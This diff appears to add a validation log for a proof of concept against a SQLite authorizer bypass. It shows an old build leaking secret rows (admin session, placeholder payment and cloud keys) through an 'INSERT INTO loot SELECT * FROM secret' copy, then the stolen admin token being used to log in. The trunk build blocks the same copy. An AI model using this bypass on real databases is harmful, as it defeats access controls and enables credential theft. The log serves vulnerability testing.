@@ -1,0 +1,60 @@
+SQLite remote authorizer admin break-in validation
+old-status: 3
+trunk-status: 0
+
+old log:
+victim_listening=127.0.0.1:34137
+ATTACK direct-admin-token-read SQL: SELECT label,value FROM secret WHERE label='admin_session'
+VICTIM direct-admin-token-read REPLY:
+ERR rc=23 msg=access to secret.label is prohibited
+ATTACK admin-login-before-theft SQL: ADMIN attacker_guess
+VICTIM admin-login-before-theft REPLY:
+ERR ADMIN_ACCESS=denied
+ATTACK xfer-copy-secrets SQL: INSERT INTO loot SELECT * FROM secret
+VICTIM xfer-copy-secrets REPLY:
+OK rc=0
+ATTACK loot-read-secrets SQL: SELECT label,value FROM loot
+VICTIM loot-read-secrets REPLY:
+OK rc=0
+ROW label=api_key value=FLAG{sqlite_xfer_authorizer_remote_exfil}
+ROW label=backup_key value=FLAG{sqlite_vacuum_authorizer_remote_exfil}
+ROW label=admin_session value=sess_live_admin_7cd4eec7b9f241b4b5b8
+ROW label=payment_api_key value=sk_live_poc_51NxSQLiteAuthorizerBypass
+ROW label=cloud_deploy_key value=AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+ATTACK admin-login-with-stolen-token SQL: ADMIN sess_live_admin_7cd4eec7b9f241b4b5b8
+VICTIM admin-login-with-stolen-token REPLY:
+OK ADMIN_ACCESS=granted
+ADMIN_ID=1
+CAPABILITY=read_all_customer_records
+CAPABILITY=rotate_production_keys
+DIRECT_ADMIN_TOKEN_READ_BLOCKED=yes
+WRONG_ADMIN_TOKEN_REJECTED=yes
+XFER_COPY_SUCCEEDED=yes
+STOLEN_ADMIN_SESSION=sess_live_admin_7cd4eec7b9f241b4b5b8
+STOLEN_PAYMENT_KEY=sk_live_poc_51NxSQLiteAuthorizerBypass
+STOLEN_CLOUD_DEPLOY_KEY=AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+ADMIN_BREAKIN=granted
+RESULT=VULNERABLE_REMOTE_ADMIN_BREAKIN
+
+trunk log:
+victim_listening=127.0.0.1:43165
+ATTACK direct-admin-token-read SQL: SELECT label,value FROM secret WHERE label='admin_session'
+VICTIM direct-admin-token-read REPLY:
+ERR rc=23 msg=access to secret.label is prohibited
+ATTACK admin-login-before-theft SQL: ADMIN attacker_guess
+VICTIM admin-login-before-theft REPLY:
+ERR ADMIN_ACCESS=denied
+ATTACK xfer-copy-secrets SQL: INSERT INTO loot SELECT * FROM secret
+VICTIM xfer-copy-secrets REPLY:
+ERR rc=23 msg=access to secret.label is prohibited
+ATTACK loot-read-secrets SQL: SELECT label,value FROM loot
+VICTIM loot-read-secrets REPLY:
+OK rc=0
+DIRECT_ADMIN_TOKEN_READ_BLOCKED=yes
+WRONG_ADMIN_TOKEN_REJECTED=yes
+XFER_COPY_SUCCEEDED=no
+STOLEN_ADMIN_SESSION=no
+STOLEN_PAYMENT_KEY=no
+STOLEN_CLOUD_DEPLOY_KEY=no
+ADMIN_BREAKIN=no
+RESULT=SAFE_NO_ADMIN_BREAKIN
